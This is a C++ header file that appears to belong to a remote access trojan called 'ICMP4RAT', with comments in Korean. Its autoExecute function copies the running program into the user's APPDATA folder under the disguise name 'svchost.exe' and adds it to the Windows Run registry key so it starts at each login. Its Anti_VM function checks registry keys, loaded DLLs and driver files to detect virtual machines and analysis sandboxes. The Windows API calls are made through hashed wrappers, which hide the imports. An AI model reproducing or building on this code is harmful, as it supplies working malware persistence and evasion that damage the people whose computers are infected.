#pragma once
//#include <Windows.h>
#include <iostream>
#include <string>
#include <list>
#include "HashModule.h"
#include "HashFunction.h"

void autoExecute() {
    CHAR szDir[260];
    CHAR pName[260];
    GetEnvironmentVariableA_c("APPDATA", szDir, 260);
    std::string str(szDir);
    str += "\\ICMP4RAT";
    GetModuleFileNameA_c(GetModuleHandle(0), pName, 260);
    CreateDirectoryA_c(str.c_str(), NULL);
    str += "\\svchost.exe";
    CopyFileA_c(pName, str.c_str(), FALSE);
    char Driver[MAX_PATH];
    HKEY hKey;
    strcpy_s(Driver, str.c_str());
    RegOpenKeyExA_c(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);

    RegSetValueExA_c(hKey, "testtesttesttesttest", 0, REG_SZ, (const unsigned char*)Driver, MAX_PATH);
    RegCloseKey_c(hKey);
}

/* VM이 아닐경우 TRUE 반환 */
bool Anti_VM() {

    HKEY hKey;
    std::list<std::string> services = {"vpcbus",  "vpc-s3",  "vpcuhub",  "msvmmouf",  "VBoxMouse",  "VBoxGuest",  "VBoxGuest",  "VBoxSF",  "xenevtchn", "xennet",  "xennet6",  "xensvc",  "xenvdb"};
    std::list<std::string> modules = { "dbghelp",  "SbieDll",  "api_log", "dir_watch",  "pstorec" };
    std::list<std::string> drivers = { "hsfs.sys", "vmhgfs.sys", "prleth.sys", "prlfs.sys", "prlmouse.sys", "prlvideo.sys", "prl_pv32.sys", "vpc-s3.sys", "vmsrvc.sys",  "vmx86.sys", "vmnet.sys" };

    /* 레지스트리 비교 */
    if (RegOpenKeyExA_c(HKEY_LOCAL_MACHINE, "SOFTWARE\\Vmware, Inc.\\VMware Tools", 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
        return false;
    }
    else if (RegOpenKeyExA_c(HKEY_LOCAL_MACHINE, "SOFTWARE\\Vmware Inc\\VMware Tools", 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
        return false;
    }

    std::string prefix = "SYSTEM\\ControlSet001\\Services\\";
    for (std::string service : services) {
        std::string tmp = prefix + service;
        if (RegOpenKeyExA_c(HKEY_LOCAL_MACHINE,tmp.c_str(), 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
            std::cout << tmp.c_str() << std::endl;
            return false;
        }
    }
    /* dll 파일 비교 */
    for (std::string module : modules) {
        if (GetModuleHandleA_c(module.c_str()) != NULL) {
            return false;
        }
    }
     
    /* driver 파일 비교 */
    HANDLE hFind = INVALID_HANDLE_VALUE;
    WIN32_FIND_DATAA FindFileData;
    hFind = FindFirstFileA_c("C:\\Windows\\System32\\*.sys", &FindFileData);
    if (hFind != INVALID_HANDLE_VALUE) {
        while (FindNextFileA_c(hFind, &FindFileData) != 0)
        {
            for (std::string driver : drivers) {
                if (!driver.compare(FindFileData.cFileName)) {
                    return false;
                }
            }
        }
    }
    FindClose_c(hFind);

    return true;
}